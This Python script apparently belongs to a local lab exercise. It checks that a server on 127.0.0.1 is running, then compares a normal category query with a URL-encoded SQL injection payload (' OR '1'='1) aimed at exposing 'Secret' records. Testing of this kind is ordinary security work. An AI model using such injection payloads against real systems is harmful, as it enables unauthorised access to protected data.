import requests
import socket
import time

base_url = "http://127.0.0.1:33130"
target_host = "127.0.0.1"
target_port = 33130

print(f"{'='*80}")
print("SERVER CONNECTIVITY DIAGNOSTIC")
print(f"{'='*80}")

# Method 1: Check if port is open using socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    result = sock.connect_ex((target_host, target_port))
    if result == 0:
        print(f"[+] SUCCESS: Port {target_port} is OPEN on {target_host}")
    else:
        print(f"[!] FAILED: Port {target_port} is CLOSED on {target_host}")
        print(f"    Error code: {result}")
        print(f"\n[!] The server is not running or not listening on port {target_port}")
        print(f"    You need to start the server before testing")
        exit(1)
    sock.close()
except Exception as e:
    print(f"[!] Socket error: {str(e)}")

# Method 2: Try a simple HTTP request with extended timeout
try:
    print(f"\n[+] Attempting HTTP GET to {base_url}")
    print(f"    Timeout: 15 seconds")
    start_time = time.time()
    resp = requests.get(base_url, timeout=15)
    elapsed = time.time() - start_time
    print(f"[+] SUCCESS: Server responded")
    print(f"    Status: {resp.status_code}")
    print(f"    Time: {elapsed:.2f}s")
    print(f"    Content length: {len(resp.content)}B")
except requests.exceptions.ConnectionError as e:
    print(f"[!] CONNECTION ERROR: {str(e)[:200]}")
    print(f"\n[!] The server refused the connection or is not running")
    print(f"    Troubleshooting steps:")
    print(f"    1. Check if the server process is running")
    print(f"    2. Verify the correct port number (should be {target_port})")
    print(f"    3. Check server logs for errors")
    exit(1)
except requests.exceptions.Timeout:
    print(f"[!] TIMEOUT: Server didn't respond within 15 seconds")
    print(f"    The server might be running but extremely slow or hanging")
    exit(1)
except Exception as e:
    print(f"[!] UNEXPECTED ERROR: {str(e)}")
    exit(1)

# If we get here, the server is responding
print(f"\n{'='*80}")
print("[+] SERVER IS RUNNING - Proceeding with SQL injection comparison")
print(f"{'='*80}")

# Test both endpoints
endpoints = [
    f"{base_url}/?category=Secret",
    f"{base_url}/?category=Secret%27%20OR%20%271%27=%271"  # URL encoded version
]

for i, url in enumerate(endpoints, 1):
    try:
        print(f"\n[+] Test {i}: {url}")
        resp = requests.get(url, timeout=10)
        print(f"    Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Show first few lines of response
        lines = resp.text.split('\n')[:10]
        print(f"    Response preview (first 10 lines):")
        for line_num, line in enumerate(lines, 1):
            if line.strip():
                print(f"    {line_num:2d}: {line.strip()[:80]}")
    except Exception as e:
        print(f"    Error: {str(e)}")
